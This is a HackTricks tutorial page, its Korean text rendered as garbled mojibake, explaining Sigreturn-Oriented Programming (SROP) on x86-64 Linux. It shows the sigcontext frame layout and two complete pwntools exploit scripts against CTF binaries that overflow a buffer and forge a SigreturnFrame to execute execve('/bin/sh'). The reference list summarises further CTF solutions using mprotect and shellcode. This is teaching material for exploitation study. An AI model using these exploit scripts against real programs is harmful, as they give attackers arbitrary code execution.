# SROP - ì‹œê·¸ë¦¬í„´ ì§€í–¥ í”„ë¡œê·¸ë˜ë°

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ìš°ì„¸ìš”!</summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

- **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜** **PDF í˜•ì‹ìœ¼ë¡œ HackTricks ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
- [**ê³µì‹ PEASS & HackTricks êµ¿ì¦ˆ**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
- ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ê°€ì…**í•˜ê±°ë‚˜ **íŠ¸ìœ„í„°** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
- **í•´í‚¹ ìš”ë ¹ì„ ê³µìœ í•˜ë ¤ë©´** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì„¸ìš”.

</details>

## ê¸°ë³¸ ì •ë³´

**`Sigreturn`**ì€ ì£¼ë¡œ **ì‹œê·¸ë„ í•¸ë“¤ëŸ¬**ê°€ ì‹¤í–‰ì„ ì™„ë£Œí•œ í›„ ì •ë¦¬í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” íŠ¹ìˆ˜í•œ **ì‹œìŠ¤í…œ í˜¸ì¶œ**ì…ë‹ˆë‹¤. ì‹œê·¸ë„ì€ ìš´ì˜ ì²´ì œê°€ í”„ë¡œê·¸ë¨ì— ë³´ë‚´ëŠ” ì¤‘ë‹¨ìœ¼ë¡œ, ì¢…ì¢… ì˜ˆì™¸ ìƒí™©ì´ ë°œìƒí–ˆìŒì„ ë‚˜íƒ€ëƒ…ë‹ˆë‹¤. í”„ë¡œê·¸ë¨ì´ ì‹œê·¸ë„ì„ ìˆ˜ì‹ í•˜ë©´ í˜„ì¬ ì‘ì—…ì„ ì¼ì‹œ ì¤‘ì§€í•˜ê³  ì‹œê·¸ë„ì„ ì²˜ë¦¬í•˜ê¸° ìœ„í•´ ì„¤ê³„ëœ **ì‹œê·¸ë„ í•¸ë“¤ëŸ¬**ë¼ëŠ” íŠ¹ìˆ˜ í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.

ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ê°€ ì™„ë£Œë˜ë©´ í”„ë¡œê·¸ë¨ì€ ì•„ë¬´ ì¼ë„ ì¼ì–´ë‚˜ì§€ ì•Šì€ ê²ƒì²˜ëŸ¼ **ì´ì „ ìƒíƒœë¡œ ë³µê·€**í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë•Œ **`sigreturn`**ì´ í•„ìš”í•©ë‹ˆë‹¤. ì´ëŠ” í”„ë¡œê·¸ë¨ì´ **ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ì—ì„œ ë°˜í™˜**í•˜ê³  ì‹œê·¸ë„ í•¸ë“¤ëŸ¬ì—ì„œ ì‚¬ìš©ëœ **ìŠ¤íƒ í”„ë ˆì„**(í•¨ìˆ˜ í˜¸ì¶œ ë° ë¡œì»¬ ë³€ìˆ˜ë¥¼ ì €ì¥í•˜ëŠ” ë©”ëª¨ë¦¬ ì„¹ì…˜)ì„ ì •ë¦¬í•˜ì—¬ í”„ë¡œê·¸ë¨ì˜ ìƒíƒœë¥¼ ë³µì›í•˜ëŠ” ë° ë„ì›€ì„ ì¤ë‹ˆë‹¤.

í¥ë¯¸ë¡œìš´ ì ì€ **`sigreturn`**ì´ í”„ë¡œê·¸ë¨ì˜ ìƒíƒœë¥¼ ë³µì›í•˜ëŠ” ë°©ë²•ì…ë‹ˆë‹¤: **CPUì˜ ëª¨ë“  ë ˆì§€ìŠ¤í„° ê°’**ì„ ìŠ¤íƒì— ì €ì¥í•©ë‹ˆë‹¤. ì‹œê·¸ë„ì´ ë” ì´ìƒ ì°¨ë‹¨ë˜ì§€ ì•Šìœ¼ë©´ **`sigreturn`ì´ ì´ëŸ¬í•œ ê°’ì„ ìŠ¤íƒì—ì„œ íŒí•˜ì—¬** CPUì˜ ë ˆì§€ìŠ¤í„°ë¥¼ íš¨ê³¼ì ìœ¼ë¡œ ì‹œê·¸ë„ì„ ì²˜ë¦¬í•˜ê¸° ì „ì˜ ìƒíƒœë¡œ ì¬ì„¤ì •í•©ë‹ˆë‹¤. ì´ëŠ” í˜„ì¬ ìŠ¤íƒì˜ ë§¨ ìœ„ë¥¼ ê°€ë¦¬í‚¤ëŠ” ìŠ¤íƒ í¬ì¸í„° ë ˆì§€ìŠ¤í„°(RSP)ë¥¼ í¬í•¨í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ROP ì²´ì¸ì—ì„œ **`sigreturn`** ì‹œìŠ¤í…œ í˜¸ì¶œì„ í˜¸ì¶œí•˜ê³  **ìŠ¤íƒ**ì— ë¡œë“œí•˜ë ¤ëŠ” ë ˆì§€ìŠ¤íŠ¸ë¦¬ ê°’ì„ ì¶”ê°€í•˜ë©´ ëª¨ë“  ë ˆì§€ìŠ¤í„° ê°’ì„ **ì œì–´**í•  ìˆ˜ ìˆìœ¼ë©° ë”°ë¼ì„œ ì˜ˆë¥¼ ë“¤ì–´ `/bin/sh`ë¥¼ ì‚¬ìš©í•˜ì—¬ `execve` ì‹œìŠ¤í…œ í˜¸ì¶œì„ í˜¸ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

ì´ëŠ” ë‹¤ë¥¸ Ret2syscallì„ í˜¸ì¶œí•  ë•Œ ë§¤ê°œë³€ìˆ˜ë¥¼ ì‰½ê²Œ ì œì–´í•  ìˆ˜ ìˆëŠ” **Ret2syscall ìœ í˜•**ì´ ë  ê²ƒì„ì„ ì£¼ëª©í•˜ì„¸ìš”:

{% content-ref url="../rop-syscall-execv/" %}
[rop-syscall-execv](../rop-syscall-execv/)
{% endcontent-ref %}

í˜¸ê¸°ì‹¬ì´ ìƒê¸°ë©´ ë‚˜ì¤‘ì— ê°’ì„ ë³µêµ¬í•˜ê¸° ìœ„í•´ ìŠ¤íƒì— ì €ì¥ëœ **sigcontext êµ¬ì¡°**ë¥¼ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤(ì—¬ê¸°ì„œ ë‹¤ì´ì–´ê·¸ë¨ ì°¸ì¡°: [**here**](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)):
```
+--------------------+--------------------+
| rt_sigeturn()      | uc_flags           |
+--------------------+--------------------+
| &uc                | uc_stack.ss_sp     |
+--------------------+--------------------+
| uc_stack.ss_flags  | uc.stack.ss_size   |
+--------------------+--------------------+
| r8                 | r9                 |
+--------------------+--------------------+
| r10                | r11                |
+--------------------+--------------------+
| r12                | r13                |
+--------------------+--------------------+
| r14                | r15                |
+--------------------+--------------------+
| rdi                | rsi                |
+--------------------+--------------------+
| rbp                | rbx                |
+--------------------+--------------------+
| rdx                | rax                |
+--------------------+--------------------+
| rcx                | rsp                |
+--------------------+--------------------+
| rip                | eflags             |
+--------------------+--------------------+
| cs / gs / fs       | err                |
+--------------------+--------------------+
| trapno             | oldmask (unused)   |
+--------------------+--------------------+
| cr2 (segfault addr)| &fpstate           |
+--------------------+--------------------+
| __reserved         | sigmask            |
+--------------------+--------------------+
```
ë” ë‚˜ì€ ì„¤ëª…ì„ ìœ„í•´ ë‹¤ìŒë„ í™•ì¸í•˜ì‹­ì‹œì˜¤:

{% embed url="https://youtu.be/ADULSwnQs-s?feature=shared" %}

## ì˜ˆì‹œ

[**ì—¬ê¸°ì—ì„œ ì˜ˆì‹œë¥¼ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤**](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop/using-srop) ì—¬ê¸°ì„œ signeturn í˜¸ì¶œì´ ROPë¥¼ í†µí•´ êµ¬ì„±ë˜ì—ˆìœ¼ë©° (rxaì— ê°’ `0xf`ë¥¼ ë„£ìŒ), ê·¸ëŸ¬ë‚˜ ì´ê²ƒì´ ê±°ê¸°ì„œì˜ ìµœì¢… exploitì…ë‹ˆë‹¤:
```python
from pwn import *

elf = context.binary = ELF('./vuln', checksec=False)
p = process()

BINSH = elf.address + 0x1250
POP_RAX = 0x41018
SYSCALL_RET = 0x41015

frame = SigreturnFrame()
frame.rax = 0x3b            # syscall number for execve
frame.rdi = BINSH           # pointer to /bin/sh
frame.rsi = 0x0             # NULL
frame.rdx = 0x0             # NULL
frame.rip = SYSCALL_RET

payload = b'A' * 8
payload += p64(POP_RAX)
payload += p64(0xf)         # 0xf is the number of the syscall sigreturn
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p.sendline(payload)
p.interactive()
```
ì´ê³³ì—ì„œ [**exploitì„ í™•ì¸í•˜ì„¸ìš”**](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html) ë°”ì´ë„ˆë¦¬ê°€ ì´ë¯¸ `sigreturn`ì„ í˜¸ì¶œí•˜ê³  ìˆê¸° ë•Œë¬¸ì— **ROP**ë¡œ ë¹Œë“œí•  í•„ìš”ê°€ ì—†ìŠµë‹ˆë‹¤:
```python
from pwn import *

# Establish the target
target = process("./small_boi")
#gdb.attach(target, gdbscript = 'b *0x40017c')
#target = remote("pwn.chal.csaw.io", 1002)

# Establish the target architecture
context.arch = "amd64"

# Establish the address of the sigreturn function
sigreturn = p64(0x40017c)

# Start making our sigreturn frame
frame = SigreturnFrame()

frame.rip = 0x400185 # Syscall instruction
frame.rax = 59       # execve syscall
frame.rdi = 0x4001ca # Address of "/bin/sh"
frame.rsi = 0x0      # NULL
frame.rdx = 0x0      # NULL

payload = "0"*0x28 # Offset to return address
payload += sigreturn # Function with sigreturn
payload += str(frame)[8:] # Our sigreturn frame, adjusted for the 8 byte return shift of the stack

target.sendline(payload) # Send the target payload

# Drop to an interactive shell
target.interactive()
```
## ë‹¤ë¥¸ ì˜ˆì‹œ ë° ì°¸ê³  ìë£Œ

* [https://youtu.be/ADULSwnQs-s?feature=shared](https://youtu.be/ADULSwnQs-s?feature=shared)
* [https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop](https://ir0nstone.gitbook.io/notes/types/stack/syscalls/sigreturn-oriented-programming-srop)
* [https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html](https://guyinatuxedo.github.io/16-srop/backdoor\_funsignals/index.html)
* **ìŠ¤íƒì— ì“°ê³ ** **`sigreturn`** ì‹œìŠ¤í…œ í˜¸ì¶œì„ í•˜ëŠ” ì–´ì…ˆë¸”ë¦¬ ì´ì§„ íŒŒì¼. **sigreturn** êµ¬ì¡°ì²´ë¥¼ í†µí•´ **[**ret2syscall**](../rop-syscall-execv/)ë¥¼ ìŠ¤íƒì— ì“°ê³  ì´ì§„ íŒŒì¼ ë©”ëª¨ë¦¬ ë‚´ë¶€ì— ìˆëŠ” í”Œë˜ê·¸ë¥¼ ì½ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤.
* [https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html](https://guyinatuxedo.github.io/16-srop/csaw19\_smallboi/index.html)
* **ìŠ¤íƒì— ì“°ê³ ** **`sigreturn`** ì‹œìŠ¤í…œ í˜¸ì¶œì„ í•˜ëŠ” ì–´ì…ˆë¸”ë¦¬ ì´ì§„ íŒŒì¼. **sigreturn** êµ¬ì¡°ì²´ë¥¼ í†µí•´ **[**ret2syscall**](../rop-syscall-execv/)ë¥¼ ìŠ¤íƒì— ì“°ê³  (ì´ì§„ íŒŒì¼ì— `/bin/sh` ë¬¸ìì—´ì´ í¬í•¨ë˜ì–´ ìˆìŒ).
* [https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html](https://guyinatuxedo.github.io/16-srop/inctf17\_stupidrop/index.html)
* 64ë¹„íŠ¸, relro ì—†ìŒ, ìºë„ˆë¦¬ ì—†ìŒ, nx, pie ì—†ìŒ. `gets` í•¨ìˆ˜ë¥¼ ë‚¨ìš©í•˜ëŠ” ê°„ë‹¨í•œ ë²„í¼ ì˜¤ë²„í”Œë¡œìš°ë¡œ [**ret2syscall**](../rop-syscall-execv/)ë¥¼ ìˆ˜í–‰í•˜ëŠ” ê°€ì ¯ ë¶€ì¡±ì„ ì•…ìš©í•©ë‹ˆë‹¤. ROP ì²´ì¸ì€ ë‹¤ì‹œ getsë¥¼ í˜¸ì¶œí•˜ì—¬ `.bss`ì— `/bin/sh`ë¥¼ ì“°ê³ , **`alarm`** í•¨ìˆ˜ë¥¼ ì•…ìš©í•˜ì—¬ eaxë¥¼ `0xf`ë¡œ ì„¤ì •í•˜ì—¬ **SROP**ë¥¼ í˜¸ì¶œí•˜ê³  ì…¸ì„ ì‹¤í–‰í•©ë‹ˆë‹¤.
* [https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html](https://guyinatuxedo.github.io/16-srop/swamp19\_syscaller/index.html)
* 64ë¹„íŠ¸ ì–´ì…ˆë¸”ë¦¬ í”„ë¡œê·¸ë¨, relro ì—†ìŒ, ìºë„ˆë¦¬ ì—†ìŒ, nx, pie ì—†ìŒ. íë¦„ì€ ìŠ¤íƒì— ì“°ê³  ì—¬ëŸ¬ ë ˆì§€ìŠ¤í„°ë¥¼ ì œì–´í•˜ê³  ì‹œìŠ¤í…œ í˜¸ì¶œì„ í•˜ê³  ë‚˜ì„œ `exit`ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. ì„ íƒëœ ì‹œìŠ¤í…œ í˜¸ì¶œì€ `sigreturn`ì´ë©° ë ˆì§€ìŠ¤í„°ë¥¼ ì„¤ì •í•˜ê³  `eip`ë¥¼ ì´ì „ ì‹œìŠ¤í…œ í˜¸ì¶œ ëª…ë ¹ì–´ë¥¼ í˜¸ì¶œí•˜ê³  `memprotect`ë¥¼ ì‹¤í–‰í•˜ì—¬ ë°”ì´ë„ˆë¦¬ ê³µê°„ì„ `rwx`ë¡œ ì„¤ì •í•˜ê³  ESPë¥¼ ë°”ì´ë„ˆë¦¬ ê³µê°„ìœ¼ë¡œ ì„¤ì •í•©ë‹ˆë‹¤. í”„ë¡œê·¸ë¨ì€ ESPë¥¼ ë‹¤ì‹œ ì½ì–´ë“¤ì´ì§€ë§Œ ì´ ê²½ìš° ESPëŠ” ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ê°€ë¦¬í‚¤ê²Œ ë˜ë¯€ë¡œ ì…¸ì½”ë“œë¥¼ ì „ë‹¬í•˜ë©´ ë‹¤ìŒ ëª…ë ¹ì–´ë¡œ ì“°ì—¬ ì‹¤í–‰ë©ë‹ˆë‹¤.
